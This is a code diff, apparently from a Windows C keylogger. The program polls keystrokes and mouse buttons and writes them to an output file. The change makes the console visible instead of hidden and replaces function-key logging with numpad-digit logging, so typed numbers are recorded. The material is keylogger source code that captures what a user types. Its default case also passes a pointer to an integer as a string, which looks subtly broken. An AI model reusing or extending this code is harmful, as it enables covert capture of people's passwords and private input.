@@ -11,7 +11,7 @@ void saveToFile(int key_ascii);
 
 int main()
 {
-	hideConsole();
+	showConsole();
 	while (true)
 	{
 		Sleep(20);
@@ -73,41 +73,32 @@ void saveToFile(int key_ascii)
 	case VK_RBUTTON:
 		fprintf(OUTPUT_FILE, "%s", "[RIGHT MOUSE BUTTON]");
 		break;
-	case VK_F1:
-		fprintf(OUTPUT_FILE, "%s", "[F1]");
+	case VK_NUMPAD1:
+		fprintf(OUTPUT_FILE, "%s", "1");
 		break;
-	case VK_F2:
-		fprintf(OUTPUT_FILE, "%s", "[F2]");
+	case VK_NUMPAD2:
+		fprintf(OUTPUT_FILE, "%s", "2");
 		break;
-	case VK_F3:
-		fprintf(OUTPUT_FILE, "%s", "[F3]");
+	case VK_NUMPAD3:
+		fprintf(OUTPUT_FILE, "%s", "3");
 		break;
-	case VK_F4:
-		fprintf(OUTPUT_FILE, "%s", "[F4]");
+	case VK_NUMPAD4:
+		fprintf(OUTPUT_FILE, "%s", "4");
 		break;
-	case VK_F5:
-		fprintf(OUTPUT_FILE, "%s", "[F5]");
+	case VK_NUMPAD5:
+		fprintf(OUTPUT_FILE, "%s", "5");
 		break;
-	case VK_F6:
-		fprintf(OUTPUT_FILE, "%s", "[F6]");
+	case VK_NUMPAD6:
+		fprintf(OUTPUT_FILE, "%s", "6");
 		break;
-	case VK_F7:
-		fprintf(OUTPUT_FILE, "%s", "[F7]");
+	case VK_NUMPAD7:
+		fprintf(OUTPUT_FILE, "%s", "7");
 		break;
-	case VK_F8:
-		fprintf(OUTPUT_FILE, "%s", "[F8]");
+	case VK_NUMPAD8:
+		fprintf(OUTPUT_FILE, "%s", "8");
 		break;
-	case VK_F9:
-		fprintf(OUTPUT_FILE, "%s", "[F9]");
-		break;
-	case VK_F10:
-		fprintf(OUTPUT_FILE, "%s", "[F10]");
-		break;
-	case VK_F11:
-		fprintf(OUTPUT_FILE, "%s", "[F11]");
-		break;
-	case VK_F12:
-		fprintf(OUTPUT_FILE, "%s", "[F12]");
+	case VK_NUMPAD9:
+		fprintf(OUTPUT_FILE, "%s", "9");
 		break;
 	default:
 		fprintf(OUTPUT_FILE, "%s", &key_ascii);
